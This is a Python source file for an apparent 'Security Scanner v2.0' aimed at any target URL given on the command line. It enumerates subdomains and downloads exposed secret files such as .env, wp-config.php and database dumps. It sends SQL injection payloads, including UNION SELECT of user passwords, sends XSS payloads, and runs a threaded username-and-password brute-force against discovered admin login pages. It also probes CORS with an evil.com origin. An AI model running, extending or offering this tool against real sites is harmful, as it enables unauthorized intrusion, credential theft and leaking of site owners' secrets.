import requests
import json
import os
import time
import concurrent.futures
import dns.resolver
import sys
import ssl
import socket
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup

# Output directory for downloaded files
DOWNLOAD_DIR = "downloaded_files"

# Sensitive files to check (expanded list)
SENSITIVE_FILES = [
    ".env", "config.json", "database.sql", "backup.zip", ".git/config",
    ".htaccess", "robots.txt", "wp-config.php", "config.php"
]

# Admin panel paths
ADMIN_PATHS = ["admin", "wp-admin", "dashboard", "login", "user", "cpanel", "secure", "manager"]

# Common subdomains
SUBDOMAINS = ["www", "mail", "ftp", "blog", "api", "dev", "test", "staging", "admin", "shop", "secure"]

# Common directories for listing checks
COMMON_DIRECTORIES = ["uploads", "images", "css", "js", "files", "backup", "assets"]

# SQL Injection payloads
SQL_PAYLOADS = [
    "'", '"', " OR 1=1--", "' OR '1'='1' --", '" OR "1"="1" --',
    "' UNION SELECT NULL, username, password FROM users --",
    "' UNION SELECT NULL, table_name FROM information_schema.tables --",
    "' AND SLEEP(5)--", "' OR 1=1#"
]

# XSS Payloads
XSS_PAYLOADS = [
    '<script>alert("XSS")</script>', '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
    "<body onload=alert(1)>", "<script>document.write(1)</script>"
]

# Username and Password wordlists
USERNAME_FILE = "usernames.txt"
PASSWORD_FILE = "passwords.txt"

# Colors for hacker-like output
GREEN = "\033[1;32m"
RED = "\033[1;31m"
YELLOW = "\033[1;33m"
RESET = "\033[0m"

def print_banner():
    """Display the updated ASCII banner with project name and version."""
    print(GREEN + r"""
   _____                     _    _____                                  
  / ____|                   | |  / ____|                                 
 | (___  _   _  __ _ _ __ __| | | (___   ___ _ ____   _____ _ __ ___  ___ 
  \___ \| | | |/ _` | '__/ _` |  \___ \ / _ \ '__\ \ / / _ \ '__/ __|/ _ \
  ____) | |_| | (_| | | | (_| |  ____) |  __/ |   \ V /  __/ |  \__ \  __/
 |_____/ \__,_|\__,_|_|  \__,_| |_____/ \___|_|    \_/ \___|_|  |___/\___|
                                                                          
          Security Scanner v2.0 - Advanced Data & File Downloader Dev by Space-Exe
""" + RESET)

def save_results(data):
    """Save scan results to a JSON file with timestamp."""
    timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"scan_results_{timestamp}.json"
    with open(filename, "w") as f:
        json.dump(data, f, indent=4)
    print(GREEN + f"[✔] Scan results saved to {filename}" + RESET)

def download_file(url, filename):
    """Download a file if found."""
    try:
        response = requests.get(url, timeout=5, stream=True)
        if response.status_code == 200:
            file_path = os.path.join(DOWNLOAD_DIR, filename)
            with open(file_path, "wb") as file:
                for chunk in response.iter_content(chunk_size=1024):
                    file.write(chunk)
            print(GREEN + f"[✔] Downloaded: {filename}" + RESET)
            return file_path
    except requests.RequestException:
        pass
    return None

def scan_subdomains(domain):
    """Find subdomains of the target domain."""
    print(YELLOW + "[*] Scanning for subdomains..." + RESET)
    subdomains_found = []
    def check_subdomain(subdomain):
        url = f"http://{subdomain}.{domain}"
        try:
            response = requests.get(url, timeout=3)
            if response.status_code < 400:
                subdomains_found.append(url)
        except requests.RequestException:
            pass
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(check_subdomain, SUBDOMAINS)
    return subdomains_found

def check_sensitive_files(url):
    """Check for and download exposed sensitive files."""
    print(YELLOW + "[*] Checking for exposed sensitive files..." + RESET)
    exposed_files = []
    for file in SENSITIVE_FILES:
        test_url = f"{url.rstrip('/')}/{file}"
        try:
            response = requests.get(test_url, timeout=5)
            if response.status_code == 200:
                filename = file.replace("/", "_")
                file_path = download_file(test_url, filename)
                exposed_files.append({"file": file, "url": test_url, "downloaded": bool(file_path)})
        except requests.RequestException:
            pass
    return exposed_files

def brute_force_admin_panel(url):
    """Check for common admin panel locations."""
    print(YELLOW + "[*] Brute-forcing admin panel locations..." + RESET)
    found_panels = []
    for path in ADMIN_PATHS:
        test_url = f"{url.rstrip('/')}/{path}"
        try:
            response = requests.get(test_url, timeout=5)
            if response.status_code == 200:
                found_panels.append(test_url)
        except requests.RequestException:
            pass
    return found_panels

def brute_force_login(login_url):
    """Perform a brute-force attack on the login endpoint."""
    print(YELLOW + f"[*] Starting brute-force attack on {login_url}..." + RESET)
    if not os.path.exists(USERNAME_FILE) or not os.path.exists(PASSWORD_FILE):
        print(RED + "[!] Username or password file missing! Skipping brute-force." + RESET)
        return []
    with open(USERNAME_FILE, "r") as u_file, open(PASSWORD_FILE, "r") as p_file:
        usernames = [line.strip() for line in u_file]
        passwords = [line.strip() for line in p_file]
    login_results = []
    def test_login(username, password):
        session = requests.Session()
        data = {"username": username, "password": password}
        try:
            response = session.post(login_url, data=data, timeout=5)
            if "invalid" not in response.text.lower() and response.status_code == 200:
                print(GREEN + f"[✔] Valid credentials found: {username}:{password}" + RESET)
                login_results.append({"username": username, "password": password, "login_url": login_url})
        except requests.RequestException:
            pass
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        for username in usernames:
            for password in passwords:
                executor.submit(test_login, username, password)
    return login_results

def check_sql_injection(url):
    """Test for SQL Injection vulnerabilities."""
    print(YELLOW + "[*] Testing for SQL Injection..." + RESET)
    sql_vulnerable = []
    def test_payload(payload):
        test_url = f"{url}?id={payload}"
        try:
            response = requests.get(test_url, timeout=5)
            if any(error in response.text.lower() for error in ["sql", "syntax", "mysql", "error"]):
                sql_vulnerable.append(test_url)
        except requests.RequestException:
            pass
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(test_payload, SQL_PAYLOADS)
    return sql_vulnerable

def check_xss(url):
    """Test for XSS vulnerabilities."""
    print(YELLOW + "[*] Testing for XSS..." + RESET)
    xss_vulnerable = []
    def test_payload(payload):
        test_url = f"{url}?q={payload}"
        try:
            response = requests.get(test_url, timeout=5)
            if payload in response.text:
                xss_vulnerable.append(test_url)
        except requests.RequestException:
            pass
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(test_payload, XSS_PAYLOADS)
    return xss_vulnerable

def check_http_headers(url):
    """Check for missing HTTP security headers."""
    print(YELLOW + "[*] Checking HTTP security headers..." + RESET)
    security_headers = [
        "Strict-Transport-Security", "X-Frame-Options",
        "X-XSS-Protection", "Content-Security-Policy",
        "X-Content-Type-Options", "Referrer-Policy"
    ]
    try:
        response = requests.get(url, timeout=5)
        headers = response.headers
        missing_headers = [h for h in security_headers if h not in headers]
        return missing_headers
    except Exception as e:
        print(RED + f"[!] Failed to check headers: {e}" + RESET)
        return []

def scan_dns_records(domain):
    """Retrieve DNS records for the target domain."""
    print(YELLOW + "[*] Retrieving DNS records..." + RESET)
    records = {}
    try:
        records["A"] = [r.address for r in dns.resolver.resolve(domain, "A")]
        records["MX"] = [str(r.exchange) for r in dns.resolver.resolve(domain, "MX")]
        records["NS"] = [str(r) for r in dns.resolver.resolve(domain, "NS")]
    except Exception as e:
        print(RED + f"[!] Failed to retrieve DNS records: {e}" + RESET)
    return records

def download_additional_files(url):
    """Download additional necessary files like homepage, sitemap, robots.txt, and favicon.ico."""
    additional_downloads = {}
    # Download homepage (index.html)
    homepage_file = download_file(url, "index.html")
    if homepage_file:
        additional_downloads["homepage"] = homepage_file

    # Download sitemap.xml
    sitemap_url = f"{url.rstrip('/')}/sitemap.xml"
    sitemap_file = download_file(sitemap_url, "sitemap.xml")
    if sitemap_file:
        additional_downloads["sitemap"] = sitemap_file

    # Download robots.txt
    robots_url = f"{url.rstrip('/')}/robots.txt"
    robots_file = download_file(robots_url, "robots.txt")
    if robots_file:
        additional_downloads["robots.txt"] = robots_file

    # Download favicon.ico
    favicon_url = f"{url.rstrip('/')}/favicon.ico"
    favicon_file = download_file(favicon_url, "favicon.ico")
    if favicon_file:
        additional_downloads["favicon.ico"] = favicon_file

    return additional_downloads

def crawl_resources(url):
    """Crawl the homepage for CSS and JS resources and download them."""
    downloaded_resources = {}
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            # Extract CSS and JavaScript links
            css_links = [link.get('href') for link in soup.find_all('link', rel='stylesheet') if link.get('href')]
            js_links = [script.get('src') for script in soup.find_all('script') if script.get('src')]
            resource_links = css_links + js_links
            for link in resource_links:
                # Convert relative URLs to absolute
                absolute_link = link if link.startswith("http") else urljoin(url, link)
                filename = os.path.basename(urlparse(absolute_link).path)
                if not filename:
                    filename = "resource"
                file_path = download_file(absolute_link, filename)
                if file_path:
                    downloaded_resources[absolute_link] = file_path
    except Exception as e:
        print(RED + f"[!] Failed to crawl resources: {e}" + RESET)
    return downloaded_resources

def check_directory_listing(url):
    """Check common directories for enabled directory listing."""
    print(YELLOW + "[*] Checking for directory listing..." + RESET)
    listed_directories = []
    for directory in COMMON_DIRECTORIES:
        test_url = f"{url.rstrip('/')}/{directory}/"
        try:
            response = requests.get(test_url, timeout=5)
            # A common sign of directory listing is the phrase "Index of /"
            if response.status_code == 200 and "Index of /" in response.text:
                print(GREEN + f"[✔] Directory listing enabled at: {test_url}" + RESET)
                listed_directories.append(test_url)
        except requests.RequestException:
            pass
    return listed_directories

def check_http_methods(url):
    """Check which HTTP methods are allowed via an OPTIONS request."""
    print(YELLOW + "[*] Checking allowed HTTP methods..." + RESET)
    allowed_methods = []
    try:
        response = requests.options(url, timeout=5)
        methods = response.headers.get("Allow")
        if methods:
            allowed_methods = [m.strip() for m in methods.split(",")]
            print(GREEN + f"[✔] Allowed HTTP methods: {allowed_methods}" + RESET)
    except requests.RequestException:
        pass
    return allowed_methods

def get_ssl_info(url):
    """Retrieve SSL certificate information if available."""
    print(YELLOW + "[*] Retrieving SSL certificate info..." + RESET)
    parsed = urlparse(url)
    if parsed.scheme != "https":
        return {}
    hostname = parsed.hostname
    port = parsed.port if parsed.port else 443
    try:
        context = ssl.create_default_context()
        with socket.create_connection((hostname, port), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
                return cert
    except Exception as e:
        print(RED + f"[!] Failed to retrieve SSL certificate: {e}" + RESET)
        return {}

def check_cors(url):
    """Check for potential CORS misconfigurations."""
    print(YELLOW + "[*] Checking CORS misconfiguration..." + RESET)
    try:
        headers = {"Origin": "http://evil.com"}
        response = requests.get(url, headers=headers, timeout=5)
        cors = response.headers.get("Access-Control-Allow-Origin")
        if cors and cors == "*":
            print(GREEN + "[✔] CORS misconfiguration detected!" + RESET)
            return True
    except requests.RequestException:
        pass
    return False

if __name__ == "__main__":
    # Print the banner
    print_banner()

    # Check for target URL argument
    if len(sys.argv) < 2:
        print(RED + "[!] Usage: python scanner.py <target_url>" + RESET)
        sys.exit(1)

    # Get and format the target URL
    target_url = sys.argv[1]
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        target_url = "http://" + target_url
    domain = urlparse(target_url).netloc

    print(GREEN + f"[*] Starting full security scan on {target_url}" + RESET)

    # Create download directory if it doesn't exist
    if not os.path.exists(DOWNLOAD_DIR):
        os.makedirs(DOWNLOAD_DIR)

    # Initialize urgent fix list for files that need to be fixed urgently
    urgent_fix = []

    # Scan for exposed sensitive files
    sensitive_results = check_sensitive_files(target_url)
    for result in sensitive_results:
        if result.get("downloaded"):
            urgent_fix.append(result)

    # Initialize scan results dictionary with advanced features
    scan_results = {
        "target": target_url,
        "subdomains": scan_subdomains(domain),
        "sensitive_files": sensitive_results,
        "admin_panels": [],
        "sql_injection": check_sql_injection(target_url),
        "xss_vulnerabilities": check_xss(target_url),
        "missing_security_headers": check_http_headers(target_url),
        "dns_records": scan_dns_records(domain),
        "additional_files": download_additional_files(target_url),
        "downloaded_resources": crawl_resources(target_url),
        "directory_listing": check_directory_listing(target_url),
        "allowed_http_methods": check_http_methods(target_url),
        "ssl_certificate": get_ssl_info(target_url),
        "cors_issue": check_cors(target_url),
        "urgent_fix": urgent_fix
    }

    # Find admin panels and attempt brute-force login
    admin_panels = brute_force_admin_panel(target_url)
    for admin_url in admin_panels:
        login_url = f"{admin_url.rstrip('/')}/login"
        brute_force_results = brute_force_login(login_url)
        scan_results["admin_panels"].append({
            "url": admin_url,
            "brute_force_results": brute_force_results
        })

    # Save the results
    save_results(scan_results)
    print(GREEN + "\n[*] Scan Complete." + RESET)
